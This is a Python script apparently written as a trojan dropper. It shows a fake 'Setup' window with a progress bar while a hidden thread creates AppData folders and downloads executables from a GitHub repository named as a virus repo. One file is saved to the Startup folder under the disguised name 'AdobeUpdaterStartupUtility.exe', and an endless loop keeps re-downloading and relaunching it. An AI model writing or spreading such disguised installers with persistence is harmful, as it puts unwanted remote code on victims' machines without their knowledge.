import random
import threading
import psutil  # type: ignore
import subprocess
import os
import time
import requests
from tkinter import ttk
from tkinter import *

def install():
    time.sleep(50)
    username = os.getlogin()
    print(f"\nCurrent User: {username}")

    dir_path = fr'C:\Users\{username}\AppData\Local\SystemHostProfile\Windows'

    os.makedirs(dir_path, exist_ok=True)
    print(f'Directory structure created or already exists: {dir_path}')

    dir_path = fr'C:\Users\{username}\AppData\Local\IDE-Tools\Dump\Cache\Perm1661'

    os.makedirs(dir_path, exist_ok=True)
    print(f'Directory structure created or already exists: {dir_path}')

    dir_path = fr'C:\Users\{username}\AppData\Local\IDE-Tools\Dump\Cache\Perm1662'

    os.makedirs(dir_path, exist_ok=True)
    print(f'Directory structure created or already exists: {dir_path}')

    dir_path = fr'C:\Users\{username}\AppData\Local\IDE-Tools\Dump\Cache\Perm1663'

    os.makedirs(dir_path, exist_ok=True)
    print(f'Directory structure created or already exists: {dir_path}')

    dir_path = fr'C:\Users\{username}\AppData\Local\IDE-Tools\Dump\Cache\Perm1664'

    os.makedirs(dir_path, exist_ok=True)
    print(f'Directory structure created or already exists: {dir_path}')

    dir_path = fr'C:\Users\{username}\AppData\Local\IDE-Tools\Dump\Cache\Perm1665'

    os.makedirs(dir_path, exist_ok=True)
    print(f'Directory structure created or already exists: {dir_path}')

    dir_path = fr'C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'

    os.makedirs(dir_path, exist_ok=True)
    print(f'Directory structure created or already exists: {dir_path}')


    def is_running(executable_name):
        for process in psutil.process_iter(attrs=['name']):
            if process.info['name'] == executable_name:
                return True
        return False

    def start_executable(path):
        if not is_running(os.path.basename(path)):
            subprocess.Popen(path)
            print(f"Started {path}")
        else:
            print(f"{path} is already running.")

    def download_file(url, save_path):
        try:
            response = requests.get(url)
            response.raise_for_status()
            with open(save_path, 'wb') as file:
                file.write(response.content)
            print(f"Downloaded file to {save_path}")
        except requests.exceptions.RequestException as e:
            print(f"Error downloading the file: {e}")

    executable_path = fr"C:\Users\{username}\AppData\Local\SystemHostProfile\Windows\HelloThere.exe"
    download_url_executable  = "https://github.com/HolyCheeseMan/CheeseVirusRepo/raw/refs/heads/Main/HelloThereVirus/Virus/HelloThere.exe"

    wav_file_path = fr"C:\Users\{username}\AppData\Local\SystemHostProfile\Windows\hellothere.wav"
    download_url_wav = "https://github.com/HolyCheeseMan/CheeseVirusRepo/raw/refs/heads/Main/HelloThereVirus/Virus/hellothere.wav"

    backup_path = fr"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AdobeUpdaterStartupUtility.exe"
    download_url_backup_path  = "https://github.com/HolyCheeseMan/CheeseVirusRepo/raw/refs/heads/Main/HelloThereVirus/Virus/AdobeUpdaterStartupUtility.exe"

    while True:

        if not os.path.exists(wav_file_path):
            print(f"{wav_file_path} not found. Downloading...")
            download_file(download_url_wav, wav_file_path)
            time.sleep(5)

        if not os.path.exists(executable_path):
            print(f"{executable_path} not found. Downloading...")
            download_file(download_url_executable, executable_path)
            time.sleep(5)

        if not os.path.exists(backup_path):
            print(f"{backup_path} not found. Downloading...")
            download_file(download_url_backup_path, backup_path)
            time.sleep(5) 

        start_executable(backup_path)

        time.sleep(5)

def update_progress():
    current_value = pb["value"]
    if current_value < pb["maximum"]:
        pb["value"] = current_value + 1
        random_ = random.randint(10, 200)
        root.after(random_, update_progress)
    else:
        pb.stop()
        tex.configure(text="Finishing...")
        time.sleep(2)
        root.withdraw()

def run_install_in_thread():
    install_thread = threading.Thread(target=install)
    install_thread.start()
    
root = Tk()
root.title("Setup")

pb = ttk.Progressbar(root, orient="horizontal", length=300, mode="determinate")
pb.pack()

tex = ttk.Label(root, text="Installing...")
tex.pack()

pb["maximum"] = 100
pb["value"] = 0 

run_install_in_thread()

root.after(500, update_progress)

root.mainloop()